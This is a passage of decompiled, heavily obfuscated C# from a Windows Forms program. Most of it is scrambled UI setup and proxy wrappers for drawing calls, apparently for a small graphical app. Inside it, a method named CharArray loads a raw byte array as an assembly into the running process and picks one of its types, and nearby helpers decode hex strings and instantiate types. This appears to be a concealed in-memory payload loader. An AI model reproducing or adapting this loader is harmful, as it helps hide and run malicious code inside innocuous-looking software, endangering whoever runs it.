					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1115734361) ^ 0xD898195;
					continue;
				case 14u:
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -1359710590) ^ -35594359;
					continue;
				case 13u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)(num2 * 1614994013) ^ -1286886543;
					continue;
				case 12u:
					label6 = Form1.smethod_57();
					num = (int)((num2 * 1559979884) ^ 0x102C531E);
					continue;
				case 11u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -1430202272) ^ 0x7AF6D3D4;
					continue;
				case 10u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = ((int)num2 * -1352834657) ^ -285005112;
					continue;
				case 9u:
					num = ((int)num2 * -356323852) ^ 0x2B1962D5;
					continue;
				case 8u:
					num = (int)((num2 * 1155719813) ^ 0x9C6AFA6);
					continue;
				case 7u:
					num = (int)((num2 * 2091263701) ^ 0x5753D87A);
					continue;
				case 6u:
					num = ((int)num2 * -705754323) ^ -2023844943;
					continue;
				case 5u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1069327930) ^ -191063638;
					continue;
				case 4u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)((num2 * 595531501) ^ 0x47405131);
					continue;
				case 3u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)(num2 * 1146640175) ^ -1788751814;
					continue;
				case 2u:
					num = ((int)num2 * -1855125554) ^ 0x693E625F;
					continue;
				case 1u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)((num2 * 1257323549) ^ 0x4916FE86);
					continue;
				case 0u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1192096744) ^ 0x7A647345;
					continue;
				default:
					return;
				case 117u:
					break;
				case 127u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
		while (true)
		{
			int num = -446044370;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9FFBD36Au) % 3u)
				{
				case 1u:
					goto IL_000f;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000f:
				num = ((int)num2 * -460157230) ^ -1273045465;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		return Form1.smethod_94(Form1.smethod_93(), Position);
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
